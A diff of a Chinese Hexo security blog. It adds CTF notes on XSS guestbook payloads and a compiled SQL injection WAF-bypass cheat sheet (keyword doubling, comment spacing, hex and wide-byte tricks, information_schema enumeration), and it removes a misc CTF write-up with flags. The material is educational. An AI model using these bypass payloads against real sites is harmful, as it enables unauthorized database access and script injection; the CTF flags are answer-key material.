+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName&#x3D;&lt;sc&lt;script&gt;ript&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&amp;mtxMessage&#x3D;3&amp;btnSign&#x3D;Sign+Guestbook</span><br></pre></td></tr></table></figure>
+<p>注意不能用hackbar改，会有编码的问题</p>
+<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p>看源码，过滤了script，故使用href</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">txtName&#x3D;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;123&lt;&#x2F;a&gt;&amp;mtxMessage&#x3D;2&amp;btnSign&#x3D;Sign+Guestbook</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 输入任意字符，如6666</span><br><span class="line">2. 提交后得到返回页面，查看6666所在的位置</span><br><span class="line">3. 通过闭合&#39;&quot;&lt;&gt;，xss注入</span><br><span class="line">	3.1 若有specialchars，需要进行fuzz测试</span><br></pre></td></tr></table></figure>
+<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;javascript&gt;alert(1)&lt;&#x2F;javascript&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;xxx&lt;&#x2F;a&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</span><br><span class="line">java&amp;#115;cript:alert(1)</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br><span class="line">#&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>草稿</p>
+<p>资源收集</p>
+<p>CTFer从0到1</p>
+<p>flappypig CTF特训营</p>
+<p>windows程序设计</p>
+<p>windows核心编程</p>
+<p>逆向工程核心原理</p>
+<p>逆向工程核心原理</p>
+<p>​    恶意代码分析实战</p>
+<p>​    使用ollydbg从零开始cracking（过老）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/01/CTF-Web-XSS/" data-id="ckklyhztb00002gusfdjk0p78" data-title="CTF-Web-XSS" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CTF-Web-SQL注入WAF绕过姿势" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" class="article-date">
+  <time class="dt-published" datetime="2021-01-25T07:21:00.000Z" itemprop="datePublished">2021-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入WAF绕过姿势</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingwuyou/p/10687462.html">https://www.cnblogs.com/qingwuyou/p/10687462.html</a></p>
+<h1 id="（1）大小写绕过"><a href="#（1）大小写绕过" class="headerlink" title="（1）大小写绕过"></a>（1）大小写绕过</h1><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。 </p>
+<h1 id="（2）替换关键字"><a href="#（2）替换关键字" class="headerlink" title="（2）替换关键字"></a>（2）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xx.com&#x2F;index.php?page_id&#x3D;-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+<h1 id="（3）空格绕过"><a href="#（3）空格绕过" class="headerlink" title="（3）空格绕过"></a>（3）空格绕过</h1><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;&#x2F;*&#x2F;&#x2F;from&#x2F;**&#x2F;yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车</span><br><span class="line"></span><br><span class="line">&#x2F;!select&#x2F;&#x2F;!**&#x2F;&#x2F;!from&#x2F;&#x2F;!yz*&#x2F;;</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a&#x3D;1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="（4）替换关键字"><a href="#（4）替换关键字" class="headerlink" title="（4）替换关键字"></a>（4）替换关键字</h1><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="（5）URL编码"><a href="#（5）URL编码" class="headerlink" title="（5）URL编码"></a>（5）URL编码</h1><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">insert&#x3D;link-&gt;query(urldecode($_GET[&#39;id&#39;]));</span><br><span class="line"></span><br><span class="line">row&#x3D;insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from %2579%257a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="（6）十六进制绕过（引号绕过）"><a href="#（6）十六进制绕过（引号绕过）" class="headerlink" title="（6）十六进制绕过（引号绕过）"></a>（6）十六进制绕过（引号绕过）</h1><p>在SQL语句的数据区域可以采用十六进制绕过敏感词汇</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select a from yz where b&#x3D;0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b&#x3D;char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.tables where table_name&#x3D;0x7573657273</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="（7）逗号绕过"><a href="#（7）逗号绕过" class="headerlink" title="（7）逗号绕过"></a>（7）逗号绕过</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br></pre></td></tr></table></figure>
+<p>同时也可以利用替换函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select left(database(),2)&gt;&#39;tf&#39;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>
+<h1 id="（8）比较符-lt-gt-绕过"><a href="#（8）比较符-lt-gt-绕过" class="headerlink" title="（8）比较符(&lt;,&gt;)绕过"></a>（8）比较符(&lt;,&gt;)绕过</h1><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#39;asd&#39;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br></pre></td></tr></table></figure>
+<p>新学习了一种骚骚的注入姿势in、between、order by</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select * from yz where a in (&#39;aaa&#39;); </span><br><span class="line">select substr(a,1,1) in (&#39;a&#39;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#39;a&#39; and &#39;b&#39;; </span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也可以用like，根据排列顺序进行真值判断</p>
+<h1 id="（9）注释符绕过"><a href="#（9）注释符绕过" class="headerlink" title="（9）注释符绕过"></a>（9）注释符绕过</h1><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技<br>select 1,2,3 from yz where ‘1’/1=(1=1)/‘1’=’1’<br>(1=1)中就有了判断位为下面的注入打下基础</p>
+<h1 id="（10）宽字节绕过"><a href="#（10）宽字节绕过" class="headerlink" title="（10）宽字节绕过"></a>（10）宽字节绕过</h1><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>注：<code>select</code>防止用户自定义的名称和mysql保留字冲突</p>
+<h1 id="（11）with-rollup"><a href="#（11）with-rollup" class="headerlink" title="（11）with rollup"></a>（11）with rollup</h1><p>一般结合group by使用</p>
+<p> select 1 as test from yz group by test with rollup limit 1 offset 1;</p>
+<p>+——+</p>
+<p>| test |</p>
+<p>+——+</p>
+<p>| NULL |</p>
+<p>+——+</p>
+<h1 id="（12）无列名注入"><a href="#（12）无列名注入" class="headerlink" title="（12）无列名注入"></a>（12）无列名注入</h1><p>给未知列名起别名<br>select a from (select 1,2,3aunion select * from yz)v;</p>
+<h1 id="（13）-判断列数绕过"><a href="#（13）-判断列数绕过" class="headerlink" title="（13） 判断列数绕过"></a>（13） 判断列数绕过</h1><p>当order by 被过滤后就可以使用into 变量来绕过<br>select * from yz limit 1,1 into @a,@b,@c;</p>
+<h1 id="3-SQL注入知识"><a href="#3-SQL注入知识" class="headerlink" title="3.SQL注入知识"></a>3.SQL注入知识</h1><p>1.SQL越界 ，也就是能执行自己的sql语句<br>2.盲注的话找一个点可以控制两种不同的反应<br>3.取数据并做真值判断<br>4.写脚本暴库</p>
+<p>上边是基于一般的注入题目的解题步骤，如果有特殊条件也可灵活变通</p>
+<h1 id="mysql数据库元信息"><a href="#mysql数据库元信息" class="headerlink" title="mysql数据库元信息"></a>mysql数据库元信息</h1><p>在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称<br>和访问权限。在informa_schema中常用的表有:</p>
+<p>schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。<br>tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。<br>show tables from secuiry的结果就是来自这个表<br>columns:详细地描述了某张表的所有的列以及每个列的信息。<br>show columns from users的结果就是来自这个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select database(); #查选数据库</span><br><span class="line"></span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata limit 0,1 #查询数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1; #查询表</span><br><span class="line"></span><br><span class="line">select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1; #查询列</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/25/CTF-Web-SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" data-id="ckkdrz0yv0000ugusa4k3041i" data-title="SQL注入WAF绕过姿势" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-CTF-wp-wechall答案" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/24/CTF-wp-wechall%E7%AD%94%E6%A1%88/" class="article-date">
@@ -1089,444 +1543,11 @@
 
 
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/01/12/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2021-01-12T13:52:17.596Z" itemprop="datePublished">2021-01-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/01/12/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/12/hello-world/" data-id="ckk1u3o4j0002tsus73gadf65" data-title="Hello World" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CTF-wp-攻防世界答案记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time class="dt-published" datetime="2020-12-31T06:40:57.000Z" itemprop="datePublished">2020-12-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/31/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%AD%94%E6%A1%88%E8%AE%B0%E5%BD%95/">CTF答案记录</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="攻防世界-misc初级"><a href="#攻防世界-misc初级" class="headerlink" title="攻防世界 misc初级"></a>攻防世界 misc初级</h1><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this is flag"></a>this is flag</h2><p>提交flag{th1s_!s_a_d4m0_4la9}即可</p>
-<h2 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h2><p>做法1：pdf转word后看到答案</p>
-<p>在线转换地址<a target="_blank" rel="noopener" href="https://app.xunjiepdf.com/pdf2word/">https://app.xunjiepdf.com/pdf2word/</a></p>
-<p>做法2：chrome打开pdf，直接ctrl+f搜索flag</p>
-<h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>正常打开gif，发现最后有一个二维码</p>
-<p>用ps打开gif，找到那一帧，找到对应二维码</p>
-<p>二维码需要四个角中三个角添加定位方块，用ps添加定位方块后，随便一个二维码扫描工具得到flag</p>
-<h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>得到jar文件，可以用压缩包软件打开文件还原出工程</p>
-<p>使用idea打开工程，在爆炸文件下得到明文flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p>
-<p>提交后显示flag错误，使用base64对flag中内容解码得到但</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>得到104张黑白图片</p>
-<p>使用python读取文件，白为0黑为1，得到一个字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">white &#x3D; open(&quot;.&#x2F;0.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line">black &#x3D; open(&quot;.&#x2F;1.jpg&quot;,&quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">flag_dic &#x3D; &quot;&quot;</span><br><span class="line">for i in range(104):</span><br><span class="line">	with open(&quot;.&#x2F;%d.jpg&quot;%i,&quot;rb&quot;) as f:</span><br><span class="line">		if f.read() &#x3D;&#x3D; white:</span><br><span class="line">			flag_dic +&#x3D; &quot;0&quot;</span><br><span class="line">		else:</span><br><span class="line">			flag_dic +&#x3D; &quot;1&quot;</span><br><span class="line">print(flag_dic)</span><br><span class="line"></span><br><span class="line">01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</span><br></pre></td></tr></table></figure>
-<p>使用在线的二进制转字符串工具得到答案</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>最大字符不超过f，判断为十六进制</p>
-<p>将两个连续数字设为一个字节，代表一个符号。所有字节大于128，而ASCII码表均小于128，故均减去128</p>
-<p>得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;</span><br><span class="line">count &#x3D; 0</span><br><span class="line">tempstr &#x3D; &quot;&quot;</span><br><span class="line">ans &#x3D; &quot;&quot;</span><br><span class="line">for s in str:</span><br><span class="line">	tempstr +&#x3D; s</span><br><span class="line">	if len(tempstr) &#x3D;&#x3D; 2:</span><br><span class="line">		ans +&#x3D; chr(int(tempstr, 16) - 128)</span><br><span class="line">		# print(int(tempstr, 16))</span><br><span class="line">		tempstr &#x3D; &quot;&quot;</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line">Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr</span><br></pre></td></tr></table></figure>
-<h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>使用与佛论禅论坛，<a target="_blank" rel="noopener" href="http://keyfc.net/bbs/tools/tudoucode.aspx%EF%BC%8C%E5%AF%B9%E6%96%87%E5%AD%97%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0">http://keyfc.net/bbs/tools/tudoucode.aspx，对文字进行解密得到</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</span><br></pre></td></tr></table></figure>
-<p>根据题目提示，使用ROT13编码进行解密</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</span><br></pre></td></tr></table></figure>
-<p>再使用base64进行编码，得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>工具：福昕pdf编辑器</p>
-<p>思路：从pdf文件中找到字符，再进行加解密</p>
-<p>去除无用信息后，选中“编辑对象”，框选一大片区域，发现字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</span><br></pre></td></tr></table></figure>
-<p>类似于培根密码，但培根密码为5位一组，不符合。此字符串中只有AB两种字符，类似于二进制，联想摩斯密码，解密后得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p>采用a和b两种字符表示的字符串，5位字符一组</p>
-<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><h2 id="simpleRAR"><a href="#simpleRAR" class="headerlink" title="simpleRAR"></a>simpleRAR</h2><p>工具：winhex，stegsolve（图片隐写工具），photoshop</p>
-<p>首先下载得到一个rar文件，打开后提示“secure.png”文件头损坏。</p>
-<p>尝试使用winrar直接修复，结果是把secure.png直接删除。尝试失败。</p>
-<p>上网查阅rar块构成后，将“Cflag is not here?”后十六进制的7A更改为74。成功解压得到secure.png</p>
-<p>根据题目提示，将png放入photoshop中。photoshop提示非png文件。</p>
-<p>使用winhex打开secure.png，头部标识</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">474946</span><br></pre></td></tr></table></figure>
-<p>表示这是一个gif文件。更改后缀名后放入photoshop中，得到两个图层。</p>
-<p>分别将两个图层的空白图片放入stegsolve，得到二维码。放入photoshop合成二维码并补充三个角，扫码后得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="rar头部构成"><a href="#rar头部构成" class="headerlink" title="rar头部构成"></a>rar头部构成</h3><p>每个数据块结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEAD_CRC：校验码，2字节</span><br><span class="line">HEAD_TYPE：块类型，1字节</span><br><span class="line">HEAD_FLAGS：块标记，2字节</span><br><span class="line">最后两字节：块大小</span><br></pre></td></tr></table></figure>
-<p>整个RAR文件数据块构成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">标记块：HEAD_TYPE&#x3D;0x72</span><br><span class="line">压缩文件头：HEAD_TYPE&#x3D;0x74</span><br><span class="line">文件头：HEAD_TYPE&#x3D;0x74</span><br></pre></td></tr></table></figure>
-<h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>工具：winhex</p>
-<p>知识点：zip伪加密，base64隐写</p>
-<p>首先要用winhex，修改zip的压缩源文件数据区全局加密处的字节</p>
-<p>得到一个文件stego.txt。结合题目提示，对其进行base64解码，并未得到期望的结果。</p>
-<p>查阅wp可知考察base64隐写。base64隐写不等于base64解码</p>
